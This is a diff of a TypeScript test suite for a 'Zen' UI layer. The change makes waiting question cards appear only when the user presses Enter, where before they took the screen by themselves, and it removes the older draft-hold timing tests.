@@ -17,7 +17,7 @@ import { hotkeyOf } from "../gui/hotkeys.ts";
 import "../gui/zenrows.ts"; // the Zen chunk registers the Zen rows
 /** A Zen keydown as the page routes it: the keymap's row for the face, then the layer's answer (what main.ts does through the core). */
 const press = (z: { tap(): boolean }, target: unknown, key: string) => { const hot = hotkeyOf({ key, ctrlKey: false, altKey: false, metaKey: false, isComposing: false, defaultPrevented: false, target }, false, false, "zen"); return (hot === "pause" || hot === "talk") && z.tap(); }; // Enter is `talk` (it ends a pause, else unfolds the head tower's input), Space `pause`
-const { DRAFT_MS, mountZen, real } = await import("../gui/zen.ts");
+const { mountZen, real } = await import("../gui/zen.ts");
 const { onStep } = await import("../gui/terminalthen.ts");
 type Exit = import("../gui/zen.ts").Exit;
 
@@ -97,6 +97,8 @@ test("an answerable select draws through the dialog's own panel: Send, Cancel wh
 	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ cancel: true }) })]));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	assert.equal(r.root.hidden, false);
 	assert.deepEqual(r.calls.sound, ["bowl"], "the bowl as the item takes the screen");
 	assert.ok(r.text().includes("ops-main") && r.text().includes("Harbor"), "who asks, and from which base");
@@ -119,6 +121,8 @@ test("an accepted answer that leaves a step in a terminal opens the card of the 
 		r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select() })]));
 		r.z.show();
 		await r.settle();
+		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+		await r.settle();
 		r.by((el) => el.getAttribute("role") === "radio")[0]!.click();
 		r.button("Send answer")!.click();
 		await r.reply({ outcome: "accepted", then: { terminal: true } });
@@ -133,10 +137,14 @@ test("a questionnaire has Send and Cancel; no Cancel without an owner that takes
 	r.feed(net([unit("a", "waiting", { since: 5, pending: questions() })]));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	assert.ok(r.button("Send answer") && r.button("Cancel") && r.button("Maybe later"));
 	const again = rig();
 	again.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
 	again.z.show();
+	await again.settle();
+	again.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await again.settle();
 	assert.equal(again.button("Cancel"), undefined, "the owner did not say it takes a cancel");
 	assert.ok(again.button("Maybe later"), "Not now is on every card");
@@ -148,6 +156,8 @@ test("a card with several questions puts them in one column with the first focus
 	const r = rig();
 	r.feed(net([unit("a", "waiting", { since: 5, pending: several() })]));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	const scrollers = () => r.by((el) => el.getAttribute("class") === "zen-qs");
 	assert.equal(scrollers().length, 1);
@@ -170,6 +180,8 @@ test("a card with several questions puts them in one column with the first focus
 	one.feed(net([unit("a", "waiting", { since: 5, pending: questions() })]));
 	one.z.show();
 	await one.settle();
+	one.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await one.settle();
 	assert.equal(one.by((el) => el.getAttribute("class") === "zen-qs").length, 0, "a single question is not wrapped");
 });
 
@@ -178,10 +190,14 @@ test("Zen hands its injected remote to the dialog: on a paired device a hereOnly
 	paired.feed(net([unit("a", "waiting", { since: 5, pending: select({ cancel: true }) })]));
 	paired.z.show();
 	await paired.settle();
+	paired.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await paired.settle();
 	assert.ok(paired.button("Cancel"), "some choice is the device's to give");
 	const here = rig({ remote: true });
 	here.feed(net([unit("a", "waiting", { since: 5, pending: select({ cancel: true, hereOnly: true }) })]));
 	here.z.show();
+	await here.settle();
+	here.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await here.settle();
 	assert.equal(here.button("Cancel"), undefined, "every choice is hereOnly: a cancel would be refused as well");
 	assert.ok(here.by((el) => el.getAttribute("role") === "radio").every((o) => o.disabled), "the hereOnly choices are shown, disabled");
@@ -191,12 +207,16 @@ test("Zen hands its injected remote to the dialog: on a paired device a hereOnly
 	local.feed(net([unit("a", "waiting", { since: 5, pending: select({ cancel: true, hereOnly: true }) })]));
 	local.z.show();
 	await local.settle();
+	local.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await local.settle();
 	assert.ok(local.by((el) => el.getAttribute("role") === "radio").every((o) => !o.disabled), "this computer's page may give them");
 	assert.ok(local.button("Cancel"));
 	Object.assign(globalThis, { location: { hostname: "192.168.1.7" } });
 	const injected = rig({ remote: false });
 	injected.feed(net([unit("a", "waiting", { since: 5, pending: select({ cancel: true, hereOnly: true }) })]));
 	injected.z.show();
+	await injected.settle();
+	injected.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await injected.settle();
 	assert.ok(injected.by((el) => el.getAttribute("role") === "radio").every((o) => !o.disabled), "an injected remote of false beats a paired host");
 });
@@ -207,6 +227,8 @@ test("a secret_drop is read-only on every page with no Open the terminal; any ot
 		r.feed(net([unit("a", "waiting", { since: 5, pending: secret() })]));
 		r.z.show();
 		await r.settle();
+		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+		await r.settle();
 		assert.equal(r.button("Send answer"), undefined);
 		assert.equal(r.button("Open the terminal"), undefined, "a secret is entered in the terminal only");
 		assert.equal(r.button("Show terminal"), undefined);
@@ -215,6 +237,8 @@ test("a secret_drop is read-only on every page with no Open the terminal; any ot
 	const r = rig();
 	r.feed(net([unit("a", "waiting", { since: 5, pending: readonly() })]));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	assert.equal(r.button("Send answer"), undefined);
 	assert.equal(r.button("Show terminal"), undefined, "Zen words it Open the terminal");
@@ -227,6 +251,8 @@ test("a trust question draws the trust panel with its three choices, answers thr
 	const r = rig();
 	r.feed(net([], [TRUST]));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	assert.ok(r.text().includes("Trust this folder?") && r.text().includes("/work/harbor"));
 	for (const label of ["Trust", "Trust this time", "Don't trust", "Maybe later"]) assert.ok(r.button(label), label);
@@ -250,9 +276,11 @@ const enter = (box: El) => box.bubble("keydown", { key: "Enter", shiftKey: false
 test("a wait the tower recorded on the boss is an item with its words, Handle, Dismiss, and Not now, and no terminal to open; Dismiss has the server drop it", async () => {
 	const sent: { path: string; body: unknown }[] = [];
 	Object.assign(globalThis, { fetch: async (path: string, init: { body: string }) => (sent.push({ path, body: JSON.parse(init.body) }), { ok: true, status: 200, json: async () => ({ rev: 2, proposals: [], entries: [] }) }) });
-	const r = rig();
+	const r = rig({ start: null }); // no session for company: the card is the only thing with a box
 	r.feed(waitNet(r));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	assert.ok(r.text().includes("Boss token needed to add the ACL") && r.text().includes("tower"), "what it waits for, and who");
 	for (const label of ["Handle", "Dismiss", "Maybe later"]) assert.ok(r.button(label), label);
@@ -268,6 +296,8 @@ test("Handle unfolds the answer box right under the question on the same card, f
 	const r = rig();
 	r.feed(waitNet(r));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	const box = waitBox(r), form = r.by((el) => el.tagName === "form" || el.classes.has("zen-head-form"))[0]!;
 	assert.equal(form.hidden, true, "folded until Handle");
@@ -286,6 +316,8 @@ test("sending posts the boss's words to the tower exactly as Standard's composer
 	const r = rig();
 	r.feed(waitNet(r));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	r.button("Handle")!.click();
 	const box = waitBox(r);
@@ -307,6 +339,8 @@ test("Esc while the answer is on its way does not fold the box, so a refusal lan
 	const r = rig();
 	r.feed(waitNet(r));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	r.button("Handle")!.click();
 	const box = waitBox(r);
@@ -335,6 +369,8 @@ test("once the server marks the wait answered the card does not come back while 
 	r.feed(waitNet(r));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	r.button("Handle")!.click();
 	waitBox(r).value = "Use the staging token";
 	enter(waitBox(r));
@@ -348,6 +384,9 @@ test("once the server marks the wait answered the card does not come back while 
 	await r.advance(600_000);
 	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 0, "not after ten minutes either");
 	r.feed(answeredNet(r, [{ id: "W3", text: "Which region for the new bucket?" }]));
+	await r.settle();
+	assert.equal(cards(r), 0, "a new wait waits for Enter");
+	r.z.key("talk");
 	await r.settle();
 	assert.ok(r.text().includes("Which region for the new bucket?"), "a new wait asks");
 });
@@ -367,6 +406,8 @@ test("Esc on the open box folds it with the draft kept and does nothing else; Sh
 	const r = rig();
 	r.feed(waitNet(r));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	r.button("Handle")!.click();
 	const box = waitBox(r);
@@ -393,6 +434,8 @@ test("a refusal shows under the kept draft in Zen's refusal style, plays the low
 	const r = rig();
 	r.feed(waitNet(r));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	r.button("Handle")!.click();
 	const box = waitBox(r);
@@ -422,6 +465,8 @@ test("the wait card names the unit once, in the page's language, and the unit's 
 		r.feed(n);
 		r.z.show();
 		await r.settle();
+		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+		await r.settle();
 		const text = r.by((el) => el.classes.has("zen-card"))[0]!.textContent;
 		assert.equal(text.split(name).length - 1, 1, `${locale}: the unit once on the card`);
 		assert.equal(r.by((el) => el.classes.has("zen-who"))[0]!.textContent, name, `${locale}: the title`);
@@ -436,15 +481,19 @@ test("a trust question's choices are disabled while the link is offline and enab
 		r.feed(net([], [TRUST]));
 		r.z.show();
 		await r.settle();
+		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+		await r.settle();
 		const choices = ["Trust", "Trust this time", "Don't trust"].map((label) => r.button(label)!);
 		assert.deepEqual(choices.map((c) => c.disabled), choices.map(() => offline), offline ? "no trust answer while offline" : "answerable while online");
 	}
 });
 
 test("a unit that waits with no dialog has its last line, Not now, and Open the terminal, with no composer", async () => {
-	const r = rig();
+	const r = rig({ start: null });
 	r.feed(net([unit("a", "waiting", { name: "docs-main", since: 5 })]));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	assert.ok(r.text().includes("I need a decision."));
 	assert.equal(r.calls.composers.length, 0);
@@ -459,6 +508,8 @@ test("an accepted answer plays the knock, shows its outcome for 1.2 s, then the 
 	const n = net([unit("a", "waiting", { since: 5, pending: select({ cancel: true }) })]);
 	r.feed(n);
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	r.by((el) => el.getAttribute("role") === "radio")[0]!.click();
 	r.button("Send answer")!.click();
@@ -486,6 +537,8 @@ test("a refused answer plays the low bowl and keeps the card; the item's later e
 	r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	r.by((el) => el.getAttribute("role") === "radio")[0]!.click();
 	r.button("Send answer")!.click();
 	await r.reply({ outcome: "rejected", reason: "digest" });
@@ -501,6 +554,8 @@ test("Not now rests the item without a sound, a pause follows, and the item retu
 	r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	r.button("Maybe later")!.click();
 	assert.deepEqual(r.calls.sound, ["bowl"]);
 	await r.advance(3100);
@@ -508,6 +563,10 @@ test("Not now rests the item without a sound, a pause follows, and the item retu
 	await r.advance(9 * 60_000);
 	assert.equal(r.button("Maybe later"), undefined);
 	await r.advance(60_000);
+	assert.equal(r.button("Maybe later"), undefined, "the rest is over, and the card waits for Enter: it does not take the screen by itself");
+	assert.deepEqual(r.calls.sound, ["bowl"], "no sound for it");
+	r.z.key("talk");
+	await r.settle();
 	assert.ok(r.button("Maybe later"), "back, in its place by age");
 	assert.deepEqual(r.calls.sound, ["bowl", "bowl"]);
 });
@@ -516,6 +575,8 @@ test("an item that stops waiting by itself plays the knock and says it was answe
 	const r = rig();
 	r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	r.feed(net([unit("a", "working", { since: 9 })]));
 	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
@@ -526,6 +587,8 @@ test("an outcome line fades in when it is first said, and the same words again d
 	const r = rig();
 	r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	const out = r.by((el) => el.getAttribute("class") === "zen-out")[0]!;
 	assert.equal(out.getAttribute("data-fade"), null, "no outcome, no fade");
@@ -542,6 +605,8 @@ test("the page never says how many items wait or that more do: what it draws is 
 		r.feed(net(NAMES.slice(0, count).map((name, i) => unit(name, "waiting", { name, since: 5 + i, pending: select() }))));
 		r.z.show();
 		await r.settle();
+		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+		await r.settle();
 		const card = [r.root.dump(), r.text()].join(" ");
 		for (const other of NAMES.slice(1, count)) assert.ok(!card.includes(other), `${other} is not on the screen`);
 		assert.ok(!/queue|more|also|others|waiting/i.test(card), `no queue word (${count})`);
@@ -549,7 +614,12 @@ test("the page never says how many items wait or that more do: what it draws is 
 		await r.settle();
 		shots.set(count, { card, pause: [r.root.dump(), r.text()].join(" ") });
 		await r.advance(3100);
-		if (count > 1) assert.ok(r.root.dump().includes("bravo"), "the next one comes by itself, with nothing said about it before");
+		if (count > 1) {
+			assert.ok(!r.root.dump().includes("bravo"), "the next one does not come by itself");
+			r.z.key("talk");
+			await r.settle();
+			assert.ok(r.root.dump().includes("bravo"), "it comes by Enter");
+		}
 	}
 	assert.equal(shots.get(2)!.card, shots.get(1)!.card, "the card is the same with another waiting behind it");
 	assert.equal(shots.get(5)!.card, shots.get(1)!.card);
@@ -569,6 +639,8 @@ test("Esc on an item cancels its question when it can be cancelled (the card's o
 	r.feed(net([unit("a", "waiting", { since: 5, pending: questions() }), unit("b", "waiting", { since: 9, name: "bravo", pending: select() })]));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	const out = esc(r);
 	assert.deepEqual([out.took, out.prevented], [true, 1], "Zen takes it and the page goes nowhere");
 	assert.deepEqual(r.calls.posts.map((p) => [p.key, p.action, p.body.cancel, p.body.dialog]), [["a", "answer", true, "q1"]], "the same body as the Cancel button");
@@ -576,6 +648,9 @@ test("Esc on an item cancels its question when it can be cancelled (the card's o
 	assert.deepEqual(r.calls.leave, []);
 	await r.advance(1300);
 	await r.advance(3100);
+	assert.ok(!r.text().includes("bravo"), "the next card waits for Enter");
+	r.z.key("talk");
+	await r.settle();
 	assert.ok(r.text().includes("bravo"), "the next card");
 	assert.equal(r.button("Cancel"), undefined, "this one has no Cancel");
 	esc(r);
@@ -588,6 +663,8 @@ test("Esc on a card whose answer is on its way, or with its outcome showing, is 
 	const r = rig();
 	r.feed(net([unit("a", "waiting", { since: 5, pending: questions() })]));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	esc(r);
 	await r.reply(ok);
@@ -603,6 +680,8 @@ test("a field with text takes the first Esc as a blur (the text stays); an empty
 	r.feed(net([unit("a", "waiting", { since: 5, pending: questions() })]));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	const own = r.by((el) => el.tagName === "textarea")[0]!;
 	own.focus();
 	own.type("and the on-call");
@@ -617,6 +696,8 @@ test("a field with text takes the first Esc as a blur (the text stays); an empty
 	const idle = rig();
 	idle.feed(net([unit("m", "working")]));
 	idle.z.show();
+	await idle.settle();
+	idle.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await idle.settle();
 	const box = idle.calls.composers[0]!.box;
 	box.focus();
@@ -636,6 +717,8 @@ test("on the companion, the empty state, and the pause one Esc does nothing but 
 	idle.feed(net([unit("m", "working")]));
 	idle.z.show();
 	await idle.settle();
+	idle.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await idle.settle();
 	const hint = () => idle.by((el) => el.getAttribute("class") === "zen-esc")[0]!;
 	assert.equal(hint().textContent, "");
 	esc(idle);
@@ -650,6 +733,8 @@ test("on the companion, the empty state, and the pause one Esc does nothing but 
 	slow.feed(net([unit("m", "working")]));
 	slow.z.show();
 	await slow.settle();
+	slow.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await slow.settle();
 	esc(slow);
 	await slow.advance(601);
 	assert.equal(slow.by((el) => el.getAttribute("class") === "zen-esc")[0]!.dataset.on, undefined, "the line fades with the window");
@@ -661,12 +746,16 @@ test("on the companion, the empty state, and the pause one Esc does nothing but 
 	empty.feed(net([unit("m", "working")], [], false));
 	empty.z.show();
 	await empty.settle();
+	empty.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await empty.settle();
 	esc(empty);
 	esc(empty);
 	assert.deepEqual(empty.calls.leave, [{}], "the empty state leaves for the page");
 	const pause = rig();
 	pause.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
 	pause.z.show();
+	await pause.settle();
+	pause.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await pause.settle();
 	pause.button("Maybe later")!.click();
 	esc(pause);
@@ -712,6 +801,8 @@ test("a hidden page's pause ends when the page is shown; a tap ends the pause", 
 	r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	r.button("Maybe later")!.click();
 	r.z.visible(false);
 	await r.advance(5000);
@@ -722,40 +813,52 @@ test("a hidden page's pause ends when the page is shown; a tap ends the pause", 
 	tap.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
 	tap.z.show();
 	await tap.settle();
+	tap.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await tap.settle();
 	tap.button("Maybe later")!.click();
 	assert.ok(tap.by((el) => el.getAttribute("role") === "img").length);
 	tap.root.bubble("pointerdown");
 	assert.equal(tap.by((el) => el.getAttribute("role") === "img").length, 0, "a tap skips it");
 });
 
-test("a question that arrives while the page is hidden and the pause of the last card is on draws its card at once, one that reuses the answered id too (LCL-F002)", async () => {
+test("a question that arrives while the page is hidden and the pause of the last card is on does not draw its card: the pause is over and it waits for Enter, one that reuses the answered id too (LCL-F002)", async () => {
 	for (const id of ["d9", "d1"]) {
 		const r = rig();
 		r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
 		r.z.show();
+		await r.settle();
+		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 		await r.settle();
 		r.button("Maybe later")!.click();
 		r.z.visible(false);
 		r.feed(net([unit("b", "waiting", { since: 9, pending: select({ dialog: id }) })]));
 		await r.settle();
 		assert.equal(r.by((el) => el.getAttribute("role") === "img").length, 0, `${id}: the pause is over, the circle is gone`);
-		assert.ok(r.by((el) => el.getAttribute("role") === "radio").length, `${id}: the card is drawn`);
+		assert.equal(r.by((el) => el.getAttribute("role") === "radio").length, 0, `${id}: the card is not drawn`);
+		assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.", `${id}: it waits for Enter`);
+		r.z.visible(true);
+		r.z.key("talk");
+		await r.settle();
+		assert.ok(r.by((el) => el.getAttribute("role") === "radio").length, `${id}: Enter takes it`);
 	}
 });
 
-test("a reminder goes out only for the item that takes the screen while the page is hidden or unfocused, never for the ones behind it", async () => {
+test("a hidden or unfocused page gets one reminder for each card that arrives, behind a card too, and no card is drawn; a page that is in front needs none (Z-D20)", async () => {
 	const r = rig();
 	page.hidden = true;
-	r.feed(net([unit("a", "waiting", { since: 5, pending: select() }), unit("b", "waiting", { since: 6, pending: select({ dialog: "d2" }) }), unit("c", "waiting", { since: 7, pending: select({ dialog: "d3" }) })]));
+	r.feed(net([unit("a", "waiting", { since: 5, pending: select() }), unit("b", "waiting", { since: 6, pending: select({ dialog: "d2" }) })]));
 	r.z.show();
 	await r.settle();
-	assert.deepEqual(r.calls.remind, ["a"]);
+	assert.deepEqual(r.calls.remind, ["a", "b"], "each card that waits is reminded of once, and none is drawn");
+	assert.equal(cards(r), 0);
 	r.feed(net([unit("a", "waiting", { since: 5, pending: select() }), unit("b", "waiting", { since: 6, pending: select({ dialog: "d2" }) }), unit("d", "waiting", { since: 8, pending: select({ dialog: "d4" }) })]));
-	assert.deepEqual(r.calls.remind, ["a"], "a later arrival behind the current item raises nothing");
+	assert.deepEqual(r.calls.remind, ["a", "b", "d"], "a later arrival raises one more, and the others none again");
 	const seen = rig();
 	page.hidden = false;
 	seen.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
 	seen.z.show();
+	await seen.settle();
+	seen.z.key("talk");
 	await seen.settle();
 	assert.deepEqual(seen.calls.remind, [], "a page that is in front needs no reminder");
 	page.hidden = false;
@@ -766,6 +869,8 @@ test("a card answers only while the link is live: offline its choices are disabl
 		const r = rig({ offline });
 		r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
 		r.z.show();
+		await r.settle();
+		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 		await r.settle();
 		const choices = r.by((el) => el.getAttribute("role") === "radio");
 		assert.ok(choices.length);
@@ -787,7 +892,7 @@ test("the companion's composer sends by the fixture's route for its key, and is 
 	}
 });
 
-test("the companion: the tower the boss last wrote to, its log and composer, the stream watching its key, history for its key only; an item waits while the boss types", async () => {
+test("the companion: the tower the boss last wrote to, its log and composer, the stream watching its key, history for its key only; an item that arrives waits, the boss typing or not (Z-D20)", async () => {
 	const r = rig();
 	r.feed(net([unit("m", "working")]));
 	r.z.show();
@@ -799,7 +904,7 @@ test("the companion: the tower the boss last wrote to, its log and composer, the
 	r.z.history({ key: "t", reset: true, items: [] } as HistoryEvent);
 	r.z.history({ key: "other", items: [] } as HistoryEvent);
 	assert.deepEqual(r.calls.applied.map((e) => e.key), ["t", "t"], "the fetched newest page, then the stream's event; none for the other key");
-	// The boss types in the companion's box: an item that becomes eligible waits.
+	// The boss types in the companion's box: an item that becomes eligible waits, and it waits after he has stopped too.
 	const box = r.calls.composers.at(-1)!.box;
 	box.focus();
 	box.value = "half a sentence";
@@ -810,10 +915,11 @@ test("the companion: the tower the boss last wrote to, its log and composer, the
 	assert.deepEqual(r.calls.sound, []);
 	box.value = "";
 	box.bubble("input");
-	await r.advance(10);
-	assert.ok(r.button("Maybe later"), "it takes the screen when the box empties");
-	assert.deepEqual(r.calls.sound, ["bowl"]);
-	assert.equal(r.calls.watch.at(-1), null, "and the stream stops watching the companion");
+	await r.advance(60_000);
+	assert.equal(r.button("Maybe later"), undefined, "it does not take the screen when the box empties, nor a minute later: the boss takes it");
+	assert.deepEqual(r.calls.sound, []);
+	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.", "the companion's screen says so, under the name");
+	assert.equal(r.calls.watch.at(-1), "t", "and the stream still watches the companion");
 });
 
 /** Time passes in the half seconds the layer polls a held screen at. */
@@ -821,7 +927,7 @@ const wait = async (r: { advance(ms: number): Promise<void> }, ms: number) => {
 	for (let left = ms; left > 0; left -= 500) await r.advance(Math.min(500, left));
 };
 
-test("scrolling and tapping the log change nothing: a draft in the box keeps holding the screen through a tap (the box loses the focus), a wheel, a drag, and a touch", async () => {
+test("scrolling and tapping the log change nothing: a draft in the box, a tap (the box loses the focus), a wheel, a drag, and a touch never hand the arriving card the screen, however long", async () => {
 	const r = rig();
 	r.feed(net([unit("m", "working")]));
 	r.z.show();
@@ -831,55 +937,22 @@ test("scrolling and tapping the log change nothing: a draft in the box keeps hol
 	box.type("half a sentence");
 	box.bubble("keydown"); // typing is keys
 	r.feed(net([unit("m", "working"), unit("a", "waiting", { since: 5, pending: select() })]));
-	await wait(r, 600);
+	await r.advance(600);
 	assert.equal(r.button("Maybe later"), undefined, "the item waits while he types");
 	box.blur(); // a tap, or a click on the scroll bar, takes the focus off the box
 	log.bubble("pointerdown");
-	await wait(r, 1000);
+	await r.advance(1000);
 	assert.equal(r.button("Maybe later"), undefined, "a tap on the log does not hand the screen over");
 	for (let i = 0; i < 8; i++) {
 		for (const type of ["wheel", "touchstart", "pointerdown"]) log.bubble(type);
-		await wait(r, DRAFT_MS / 4);
+		await r.advance(5000);
 	}
-	assert.equal(r.button("Maybe later"), undefined, "scrolling it, for longer than the hold, keeps the hold");
-	assert.deepEqual(r.calls.sound, [], "and makes no sound");
+	await r.advance(60_000);
+	assert.equal(r.button("Maybe later"), undefined, "nor does scrolling it, or leaving it alone, for however long");
+	assert.deepEqual(r.calls.sound, [], "and nothing makes a sound");
 	assert.equal(box.value, "half a sentence", "the draft is where he left it");
 	assert.deepEqual(r.calls.leave, [], "nothing is left or opened");
-	await wait(r, DRAFT_MS + 1000);
-	assert.ok(r.button("Maybe later"), "left alone for the hold, the draft lets the waiting item take the screen");
-});
-
-test("a focused box with text and no input for 20 s: the waiting item takes the screen", async () => {
-	const r = rig();
-	r.feed(net([unit("m", "working")]));
-	r.z.show();
-	await r.settle();
-	const box = r.calls.composers.at(-1)!.box;
-	box.focus();
-	box.type("walked away");
-	box.bubble("keydown");
-	r.feed(net([unit("m", "working"), unit("a", "waiting", { since: 5, pending: select() })]));
-	await wait(r, 600);
-	assert.equal(r.button("Maybe later"), undefined, "held while he has just typed");
-	await wait(r, DRAFT_MS + 1000);
-	assert.ok(r.button("Maybe later"), "no input for DRAFT_MS: the item takes the screen though the box has the focus");
-});
-
-test("keydown every 5 s for 60 s keeps holding a focused draft", async () => {
-	const r = rig();
-	r.feed(net([unit("m", "working")]));
-	r.z.show();
-	await r.settle();
-	const box = r.calls.composers.at(-1)!.box;
-	box.focus();
-	box.type("still typing");
-	box.bubble("keydown");
-	r.feed(net([unit("m", "working"), unit("a", "waiting", { since: 5, pending: select() })]));
-	for (let i = 0; i < 12; i++) {
-		box.bubble("keydown");
-		await wait(r, 5000);
-	}
-	assert.equal(r.button("Maybe later"), undefined, "typing keeps renewing the hold");
+	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.");
 });
 
 test("with no draft in the box a tap on the log is nothing: no item is waiting to take the screen, and the screen does not change", async () => {
@@ -955,6 +1028,8 @@ test("Enter and Space end the pause wherever the focus is, the circle takes it, 
 		r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
 		r.z.show();
 		await r.settle();
+		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+		await r.settle();
 		r.button("Maybe later")!.click();
 		const circle = r.by((el) => el.getAttribute("role") === "img")[0]!;
 		assert.equal(page.focused, circle, "the focus lands on the layer for the pause");
@@ -967,6 +1042,8 @@ test("Enter and Space end the pause wherever the focus is, the circle takes it, 
 	r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	r.button("Maybe later")!.click();
 	const corner = r.by((el) => el.getAttribute("class") === "zen-leave")[0]!;
 	corner.focus();
@@ -977,6 +1054,8 @@ test("Enter and Space end the pause wherever the focus is, the circle takes it, 
 	open.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
 	open.z.show();
 	await open.settle();
+	open.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await open.settle();
 	open.button("Maybe later")!.click();
 	open.z.terminal({ key: "a" } as never);
 	await new Promise((done) => setImmediate(done)); // the page's terminals come behind their chunk
@@ -984,9 +1063,11 @@ test("Enter and Space end the pause wherever the focus is, the circle takes it, 
 });
 
 test("a words-only item is a pane blocked on a terminal prompt: it says to answer in its terminal, opens it, and has no composer (Z3RR-F001)", async () => {
-	const r = rig();
+	const r = rig({ start: null });
 	r.feed(net([unit("a", "waiting", { name: "docs-main", since: 5 })]));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	assert.equal(r.calls.composers.length, 0, "no box to type into: the server refuses input to a blocked pane");
 	assert.ok(r.text().includes("answer it in its terminal"));
@@ -1023,35 +1104,18 @@ test("without an injected remote the dialog decides by the host: a paired device
 		r.feed(net([unit("a", "waiting", { since: 5, pending: select({ hereOnly: true }) })]));
 		r.z.show();
 		await r.settle();
+		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+		await r.settle();
 		assert.equal(r.by((el) => el.getAttribute("role") === "radio").every((o) => o.disabled), disabled, host);
 	}
-});
-
